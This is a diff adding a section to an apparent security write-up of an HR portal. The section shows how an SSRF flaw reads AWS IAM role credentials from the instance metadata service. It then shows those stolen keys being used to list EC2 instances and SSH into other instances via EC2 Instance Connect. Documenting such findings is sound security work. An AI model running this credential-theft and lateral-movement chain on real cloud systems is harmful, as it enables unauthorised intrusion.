@@ -51,6 +51,47 @@ console.log(`/api/upload?url=s3://employee-bucket/${currentUser?.id}/${file.name
 - Modify the URL parameter to point to internal resources: `/api/upload?url=http://169.254.169.254/latest/meta-data/`
 - This could potentially allow access to AWS metadata service or other internal systems
 
+#### Exploiting SSRF to Connect to Other EC2 Instances
+
+After exploiting the SSRF vulnerability, you can use the EC2 instance's IAM role to connect to other EC2 instances:
+
+1. **Access the EC2 Instance Metadata Service**:
+   ```
+   /api/upload?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role
+   ```
+   This will return temporary AWS credentials (access key, secret key, token).
+
+2. **Use AWS CLI with the stolen credentials**:
+   ```bash
+   export AWS_ACCESS_KEY_ID=ASIA...
+   export AWS_SECRET_ACCESS_KEY=stolen_secret_key
+   export AWS_SESSION_TOKEN=stolen_session_token
+   ```
+
+3. **List other EC2 instances**:
+   ```bash
+   aws ec2 describe-instances --region us-east-1
+   ```
+
+4. **Connect to another instance using EC2 Instance Connect**:
+   ```bash
+   # Generate a temporary SSH key
+   ssh-keygen -t rsa -f /tmp/temp_key -N ""
+   
+   # Push the public key to the target EC2 instance
+   aws ec2-instance-connect send-ssh-public-key \
+     --region us-east-1 \
+     --instance-id i-target-instance-id \
+     --availability-zone target-az \
+     --instance-os-user ec2-user \
+     --ssh-public-key file:///tmp/temp_key.pub
+   
+   # Connect using the private key
+   ssh -i /tmp/temp_key ec2-user@target-instance-ip
+   ```
+
+This attack works because the EC2 instance has been granted IAM permissions to connect to other instances without requiring additional credentials.
+
 ### 3. Insecure File Upload
 
 The application allows unrestricted file uploads:
